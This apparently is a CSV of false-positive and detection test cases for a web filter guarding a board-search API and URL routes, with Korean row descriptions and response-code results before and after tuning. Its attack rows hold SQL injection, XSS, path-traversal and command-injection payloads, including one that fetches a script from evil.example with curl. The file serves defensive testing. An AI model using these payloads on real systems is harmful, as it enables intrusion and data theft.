sample_id,source_file,case_id,group_name,intent_class,method,target,payload_or_query,interpretation,attack_family,expected_code,expected_meaning,observed_off,observed_on,response_code_transition,current_assessment
77,board-search-fp-mixed-100.csv,board_search_077,Board Search Mixed,normal,GET,/api/board/posts,?keyword=%EC%88%98%EA%B0%95%EC%8B%A0%EC%B2%AD&dateFrom=2026-03-10&dateTo=2026-03-24&sort=latest&page=0&size=6,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
78,board-search-fp-mixed-100.csv,board_search_078,Board Search Mixed,normal,GET,/api/board/posts,?keyword=..%2Fadmin%20%EA%B2%BD%EB%A1%9C%20%EC%84%A4%EB%AA%85&dateFrom=2026-03-10&dateTo=2026-03-24&sort=title&page=0&size=5,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,path_traversal,200,authenticated_board_search_should_return_results_or_empty,403,200,403 -> 200,resolved_after_tuning
79,board-search-fp-mixed-100.csv,board_search_079,Board Search Mixed,normal,GET,/api/board/posts,?keyword=%EA%B8%B0%EC%88%99%EC%82%AC&dateFrom=2026-03-01&dateTo=2026-04-15&sort=latest&page=0&size=6,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,normal_business_request,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
80,board-search-fp-mixed-100.csv,board_search_080,Board Search Mixed,normal,GET,/api/board/posts,?keyword=drop%20table%20%EA%B8%88%EC%A7%80%20%EC%A0%95%EC%B1%85&dateFrom=2026-03-01&dateTo=2026-04-15&sort=title&page=0&size=5,게시판 검색 기능을 정상적으로 사용하는 조회 요청이다.,sqli,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
81,board-search-fp-mixed-100.csv,board_search_081,Board Search Mixed,ambiguous,GET,/api/board/posts,?author=student1&keyword=union%20select%20%ED%95%99%EC%8A%B5%EC%9E%90%EB%A3%8C&sort=latest&page=0&size=6,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,sqli,200,authenticated_board_search_should_return_results_or_empty,403,400,403 -> 400,partial_change_needs_review
82,board-search-fp-mixed-100.csv,board_search_082,Board Search Mixed,attack,GET,/api/board/posts,?author=student1&keyword=%27%20OR%201%3D1%20--&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,sqli,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
83,board-search-fp-mixed-100.csv,board_search_083,Board Search Mixed,ambiguous,GET,/api/board/posts,?author=student2&keyword=select%20%EB%AC%B8%20%EB%B3%B4%EA%B3%A0%EC%84%9C&sort=latest&page=0&size=6,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,route_typo,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
84,board-search-fp-mixed-100.csv,board_search_084,Board Search Mixed,attack,GET,/api/board/posts,?author=student2&keyword=%22%20or%20%221%22%3D%221&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,sqli,400,explicit_attack_search_term_should_be_rejected,403,200,403 -> 200,missed_detection
85,board-search-fp-mixed-100.csv,board_search_085,Board Search Mixed,ambiguous,GET,/api/board/posts,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&keyword=%3Cscript%3E%20%ED%95%84%ED%84%B0%EB%A7%81%20%EA%B3%BC%EC%A0%9C&sort=latest&page=0&size=6,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,xss,200,authenticated_board_search_should_return_results_or_empty,403,400,403 -> 400,partial_change_needs_review
86,board-search-fp-mixed-100.csv,board_search_086,Board Search Mixed,attack,GET,/api/board/posts,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&keyword=union%20select%20password%20from%20users--&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,sqli,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
87,board-search-fp-mixed-100.csv,board_search_087,Board Search Mixed,ambiguous,GET,/api/board/posts,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&keyword=..%2Fuploads%20%EA%B2%BD%EB%A1%9C%20%EC%8B%A4%EC%8A%B5&sort=latest&page=0&size=6,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,path_traversal,200,authenticated_board_search_should_return_results_or_empty,403,200,403 -> 200,resolved_after_tuning
88,board-search-fp-mixed-100.csv,board_search_088,Board Search Mixed,attack,GET,/api/board/posts,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&keyword=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,xss,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
89,board-search-fp-mixed-100.csv,board_search_089,Board Search Mixed,ambiguous,GET,/api/board/posts,?author=%EC%9E%A5%EC%9B%90%EC%98%81&keyword=drop%20table%20%EA%B8%88%EC%A7%80%20%EC%95%88%EB%82%B4&sort=latest&page=0&size=6,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,sqli,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
90,board-search-fp-mixed-100.csv,board_search_090,Board Search Mixed,attack,GET,/api/board/posts,?author=%EC%9E%A5%EC%9B%90%EC%98%81&keyword=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&sort=latest&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,xss,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
91,board-search-fp-mixed-100.csv,board_search_091,Board Search Mixed,ambiguous,GET,/api/board/posts,?author=student1&keyword=whoami%20%EC%B6%9C%EB%A0%A5%20%EC%98%88%EC%8B%9C&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=5,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,command_injection,200,authenticated_board_search_should_return_results_or_empty,403,200,403 -> 200,resolved_after_tuning
92,board-search-fp-mixed-100.csv,board_search_092,Board Search Mixed,attack,GET,/api/board/posts,?author=student1&keyword=..%2F..%2F..%2F..%2Fetc%2Fpasswd&dateFrom=2026-02-15&dateTo=2026-04-01&sort=title&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,path_traversal,400,explicit_attack_search_term_should_be_rejected,403,403,403 -> 403,needs_review
93,board-search-fp-mixed-100.csv,board_search_093,Board Search Mixed,ambiguous,GET,/api/board/posts,?author=student2&keyword=nmap%20-sS%20%EA%B3%BC%EC%A0%9C&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=5,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,route_typo,200,authenticated_board_search_should_return_results_or_empty,403,200,403 -> 200,resolved_after_tuning
94,board-search-fp-mixed-100.csv,board_search_094,Board Search Mixed,attack,GET,/api/board/posts,?author=student2&keyword=..%252f..%252f..%252fetc%2Fpasswd&dateFrom=2026-02-15&dateTo=2026-04-01&sort=title&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,normal_business_request,400,explicit_attack_search_term_should_be_rejected,403,403,403 -> 403,needs_review
95,board-search-fp-mixed-100.csv,board_search_095,Board Search Mixed,ambiguous,GET,/api/board/posts,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&keyword=alert%20tcp%20%EA%B7%9C%EC%B9%99%20%EC%84%A4%EB%AA%85&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=5,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,route_typo,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
96,board-search-fp-mixed-100.csv,board_search_096,Board Search Mixed,attack,GET,/api/board/posts,?author=%EA%B9%80%EB%AF%BC%EC%A7%80&keyword=%3Bwhoami&dateFrom=2026-02-15&dateTo=2026-04-01&sort=title&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,command_injection,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
97,board-search-fp-mixed-100.csv,board_search_097,Board Search Mixed,ambiguous,GET,/api/board/posts,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&keyword=cmd.exe%20%EB%AC%B8%EC%9E%90%EC%97%B4%20%EC%82%AC%EB%A1%80&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=5,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,command_injection,200,authenticated_board_search_should_return_results_or_empty,400,400,400 -> 400,needs_review
98,board-search-fp-mixed-100.csv,board_search_098,Board Search Mixed,attack,GET,/api/board/posts,?author=%EA%B0%95%ED%95%B4%EB%A6%B0&keyword=%7Ccat%20%2Fetc%2Fpasswd&dateFrom=2026-02-15&dateTo=2026-04-01&sort=title&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,path_traversal,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
99,board-search-fp-mixed-100.csv,board_search_099,Board Search Mixed,ambiguous,GET,/api/board/posts,?author=%EC%9E%A5%EC%9B%90%EC%98%81&keyword=XSS%20payload%20%EB%A9%94%EB%AA%A8&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=5,게시판 검색에서 보안 용어나 경로 문자열을 문맥적으로 조회하는 요청이다. 실제 공격이 아니라 교육·분석 목적의 검색으로 해석한다.,xss,200,authenticated_board_search_should_return_results_or_empty,200,200,200 -> 200,as_designed
100,board-search-fp-mixed-100.csv,board_search_100,Board Search Mixed,attack,GET,/api/board/posts,?author=%EC%9E%A5%EC%9B%90%EC%98%81&keyword=%26%26%20curl%20http%3A%2F%2Fevil.example%2Fa.sh&dateFrom=2026-02-15&dateTo=2026-04-01&sort=title&page=0&size=5,게시판 검색 파라미터에 명확한 공격 문자열을 넣어 차단 여부를 확인하는 요청이다.,command_injection,400,explicit_attack_search_term_should_be_rejected,403,400,403 -> 400,resolved_after_tuning
101,url-typo-fp-100.csv,url_typo_001,URL Typo Mixed,ambiguous,GET,/api/public/annuoncements,,유효한 경로에서 쿼리 파라미터 오타 또는 문맥성 보안 키워드를 포함한 요청이다.,normal_business_request,404,route_typo_should_not_match_existing_endpoint,404,404,404 -> 404,as_designed
102,url-typo-fp-100.csv,url_typo_002,URL Typo Mixed,ambiguous,GET,/api/public/annuncements,,유효한 경로에서 쿼리 파라미터 오타 또는 문맥성 보안 키워드를 포함한 요청이다.,normal_business_request,404,route_typo_should_not_match_existing_endpoint,404,404,404 -> 404,as_designed
103,url-typo-fp-100.csv,url_typo_003,URL Typo Mixed,ambiguous,GET,/api/public/announcement,,유효한 경로에서 쿼리 파라미터 오타 또는 문맥성 보안 키워드를 포함한 요청이다.,normal_business_request,404,route_typo_should_not_match_existing_endpoint,404,404,404 -> 404,as_designed
104,url-typo-fp-100.csv,url_typo_004,URL Typo Mixed,ambiguous,GET,/api//public/announcements,,"정상 엔드포인트에 오탈자, 대소문자 변경, 슬래시 추가 같은 경로 변형을 적용한 요청이다.",route_typo,404,route_typo_should_not_match_existing_endpoint,200,200,200 -> 200,needs_review
105,url-typo-fp-100.csv,url_typo_005,URL Typo Mixed,ambiguous,GET,/api/public//announcements,,"정상 엔드포인트에 오탈자, 대소문자 변경, 슬래시 추가 같은 경로 변형을 적용한 요청이다.",route_typo,404,route_typo_should_not_match_existing_endpoint,200,200,200 -> 200,needs_review
106,url-typo-fp-100.csv,url_typo_006,URL Typo Mixed,ambiguous,GET,/API/public/announcements,,유효한 경로에서 쿼리 파라미터 오타 또는 문맥성 보안 키워드를 포함한 요청이다.,normal_business_request,404,route_typo_should_not_match_existing_endpoint,404,404,404 -> 404,as_designed
107,url-typo-fp-100.csv,url_typo_007,URL Typo Mixed,ambiguous,GET,/api/Public/announcements,,유효한 경로에서 쿼리 파라미터 오타 또는 문맥성 보안 키워드를 포함한 요청이다.,normal_business_request,404,route_typo_should_not_match_existing_endpoint,401,401,401 -> 401,needs_review
108,url-typo-fp-100.csv,url_typo_008,URL Typo Mixed,ambiguous,GET,/api/public/Announcements,,유효한 경로에서 쿼리 파라미터 오타 또는 문맥성 보안 키워드를 포함한 요청이다.,normal_business_request,404,route_typo_should_not_match_existing_endpoint,404,404,404 -> 404,as_designed
109,url-typo-fp-100.csv,url_typo_009,URL Typo Mixed,ambiguous,GET,/api/public/announcements/,,유효한 경로에서 쿼리 파라미터 오타 또는 문맥성 보안 키워드를 포함한 요청이다.,normal_business_request,404,route_typo_should_not_match_existing_endpoint,404,404,404 -> 404,as_designed
110,url-typo-fp-100.csv,url_typo_010,URL Typo Mixed,ambiguous,GET,/api/public/announcements//,,"정상 엔드포인트에 오탈자, 대소문자 변경, 슬래시 추가 같은 경로 변형을 적용한 요청이다.",route_typo,404,route_typo_should_not_match_existing_endpoint,404,404,404 -> 404,as_designed
111,url-typo-fp-100.csv,url_typo_011,URL Typo Mixed,ambiguous,GET,/api/public/announcements/..;/,,유효한 경로에서 쿼리 파라미터 오타 또는 문맥성 보안 키워드를 포함한 요청이다.,normal_business_request,404,route_typo_should_not_match_existing_endpoint,403,403,403 -> 403,needs_review
112,url-typo-fp-100.csv,url_typo_012,URL Typo Mixed,ambiguous,GET,/api/public/announcements/.;/,,유효한 경로에서 쿼리 파라미터 오타 또는 문맥성 보안 키워드를 포함한 요청이다.,normal_business_request,404,route_typo_should_not_match_existing_endpoint,400,400,400 -> 400,needs_review
113,url-typo-fp-100.csv,url_typo_013,URL Typo Mixed,ambiguous,GET,/api/public/announcements/%2e%2e;/,,"정상 엔드포인트에 오탈자, 대소문자 변경, 슬래시 추가 같은 경로 변형을 적용한 요청이다.",route_typo,404,route_typo_should_not_match_existing_endpoint,403,403,403 -> 403,needs_review
114,url-typo-fp-100.csv,url_typo_014,URL Typo Mixed,ambiguous,GET,/api/public/announcements/%2e/,,"정상 엔드포인트에 오탈자, 대소문자 변경, 슬래시 추가 같은 경로 변형을 적용한 요청이다.",route_typo,404,route_typo_should_not_match_existing_endpoint,400,400,400 -> 400,needs_review
